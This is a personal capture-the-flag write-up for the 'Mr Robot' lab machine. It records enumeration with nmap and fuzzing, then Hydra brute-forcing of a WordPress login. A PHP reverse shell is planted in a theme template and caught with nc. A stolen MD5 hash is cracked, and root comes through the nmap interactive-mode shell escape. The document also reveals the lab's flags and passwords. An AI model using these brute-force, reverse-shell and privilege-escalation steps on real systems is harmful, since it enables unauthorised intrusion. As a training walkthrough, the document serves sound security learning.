# Introduction
seems to be a beginner friendly CTF... again :-/  Objective is to find 3 keys so lets get started

# Enumeration
### Nmap
```sh
$ cat nmap/initial
# Nmap 7.95 scan initiated Sun Nov  3 15:45:36 2024 as: nmap -p- -oN nmap/initial 10.10.192.6
Nmap scan report for 10.10.192.6
Host is up (0.039s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https
```
*lets check out the http(s) server...*
### http server
upon opening the page we are greeted with a grub boot screen and then this
![[Pasted image 20241103155517.png]]
#### Commands
**Prepare:**
	using this command shows us a video...
	[[prepare.webm]]
**Fsociety:**
	we get another video
	[[fsociety.webm]]
**Question:**
	this time we get a slideshow of images... *this is one of them*
	 ![[Pasted image 20241103160958.png]]
**Wakeup:**
	another video...
	[[wakeup.webm]]
**Inform:**
	gets us a screen with a bunch of news letters beneath a few words from mr.robot
	![[Pasted image 20241103160114.png]]
**Join:**
	we got greeted with a dialogue where he asked us to give him a email I tried it with a trash-mail but nothing arrived.. *probably because there is no mail server running on the machine*
	![[Pasted image 20241103161651.png]]

#### robots.txt
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```
these are 2 files on the http server 
* `fsocity.dic` a wordlist
* `key-1-of-3.txt` the first key

#### Fuzzing
```
 :: Method           : GET
 :: URL              : http://10.10.192.6/FUZZ
 :: Wordlist         : FUZZ: /home/janosch/git/labs/MrRobotCTF/loot/fsocity.dic
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

images                  [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 57ms]
css                     [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 38ms]
image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 702ms]
license                 [Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 39ms]
video                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 38ms]
feed                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 646ms]
audio                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 38ms]
admin                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 38ms]
blog                    [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 38ms]
Image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 616ms]
intro                   [Status: 200, Size: 516314, Words: 2076, Lines: 2028, Duration: 44ms]
rss                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 646ms]
login                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 674ms]
readme                  [Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 40ms]
Year201120102009200820072006200520042003200220012000199919981997199619951994199319921991199019891988198719861985198419831982198119801979197819771976197519741973197219711970196919681967196619651964196319621961196019591958195719561955195419531952195119501949194819471946194519441943194219411940193919381937193619351934193319321931193019291928192719261925192419231922192119201919191819171916191519141913191219111910190919081907190619051904190319021901 [Status: 403, Size: 657, Words: 16, Lines: 10, Duration: 38ms]
..Snip..(loop)
```
##### /login
![[Pasted image 20241103173548.png]]
looks like a Wordpress login screen lets try brute-forcing for the username

# Vulnerability Assessment
### /login
lets try to find the right request using burp
```HTTP
POST /wp-login.php HTTP/1.1
Host: 10.10.237.121
Content-Length: 100
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.237.121
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.237.121/wp-login.php
Accept-Encoding: gzip, deflate, br
Cookie: wordpress_test_cookie=WP+Cookie+check
Connection: keep-alive

log=user&pwd=pass&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.237.121%2Fwp-admin%2F&testcookie=1
```

# Exploitation

## Cracking Passwords in WordPress
built this command with hydra and found a username
```sh
$ hydra -L fsocity.dic -p pass http-post-form://10.10.237.121"/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -I

..Snip..

[80][http-post-form] host: 10.10.237.121   login: Elliot   password: pass
[80][http-post-form] host: 10.10.237.121   login: elliot   password: pass
```
now lets try to find the password

_..brute forcing the password took a bit too long and I realized that I have to remove the duplicates from the wordlist.._
```sh
sort fsocity.dic | uniq > fsocity.dic.uniq
```
the size difference is quiet noticeable
```
-rw-r--r-- 1 janosch wheel 7245381 fsocity.dic
-rw-r--r-- 1 janosch wheel   96747 fsocity.dic.uniq
```

```zsh
$ hydra -l elliot -P fsocity.dic.uniq http-post-form://10.10.154.137"/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -I
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-05 15:14:16
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
[DATA] attacking http-post-form://10.10.154.137:80/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username
[STATUS] 2036.00 tries/min, 2036 tries in 00:01h, 9416 to do in 00:05h, 16 active
[80][http-post-form] host: 10.10.154.137   login: elliot   password: ER28-0652
```

## RCE exploit via Theme
found this [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) and used the Editor to replace the 404 Template with the exploit

```sh
$ nc -lvnp 1234                                                                                  ✘ 1
Connection from 10.10.52.84:37095
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 15:47:40 up 13 min,  0 users,  load average: 0.00, 0.01, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$
```
We Got A shell  ^-^
# Privilege Escalation
now that we've gotten a shell we should have a look at the home folder

```sh
$ cd /home 
$ ls
robot
$ cd robot 
$ ls
key-2-of-3.txt
password.raw-md5
$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

so we cant access the second key because we don't have privilege but the password hash seems to be in the other file so we just need to crack it

...I did a ton of research because john and hash-cat didn't give any results(_using `fsocity.dic.uniq`_). Eventually I found a page called https://crackstation.net/  that was able to crack the hash!
![[Pasted image 20250304073703.png]]

so with the password we now just need to login as mr. robot


```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$ su robot 
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/$
```

as robot we were now able to get the second Key!

---

For Key number three we got the hint: "nmap" so I did some testing and turns out that nmap is installed on the system and robot has access to use it. After testing the interactive shell I found out that all commands I run with it are as root so I took a look at /root


```bash
robot@linux:/$ nmap --interactive 


nmap> !whoami
root
nmap> !ls /root
firstboot_done  key-3-of-3.txt
nmap> !cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
nmap> 

(snipped out all the useless stuff)
```